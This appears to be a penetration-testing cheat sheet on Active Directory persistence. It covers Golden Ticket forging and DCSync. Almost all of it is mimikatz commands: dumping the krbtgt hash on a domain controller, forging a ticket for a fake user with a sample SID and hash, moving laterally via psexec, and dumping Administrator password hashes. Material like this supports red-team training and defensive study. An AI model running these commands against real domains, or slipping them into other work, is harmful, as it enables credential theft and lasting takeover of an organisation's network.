# Persistence

<details>

<summary>Golden Ticket</summary>

* When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
* The secret key is actually the password hash of a domain user account called krbtgt.

- Requires access to an account that is in Domain Admins group or compromised the DC

1. Inside DC,

```
mimikatz.exe
```

```
privilege::debug
```

```
lsadump::lsa /patch
```

* Copy out the `krbtgt` hash.

2. Delete any existing Kerberos tickets and generate a golden ticket.

```shell
kerberos::purge
```

```bash
kerberos::golden /user:fakeuser /domain:prod.corp1.com /sid:[domain-sid] /krbtgt:[krbtgt hash] /ptt		
    #kerberos::golden /user:fakeuser /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /ptt
```

3. Open anew command prompt and attempt lateral movement again

```
misc::cmd
```

```
psexec.exe \\dc01 cmd.exe
```

</details>

<details>

<summary>Domain Controller Synchronization (DCSync)</summary>

* Requires Domain admin  account.

1. On `Mimikatz.exe`,&#x20;

```
lsadump::dcsync /user:Administrator
```

* The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.

</details>

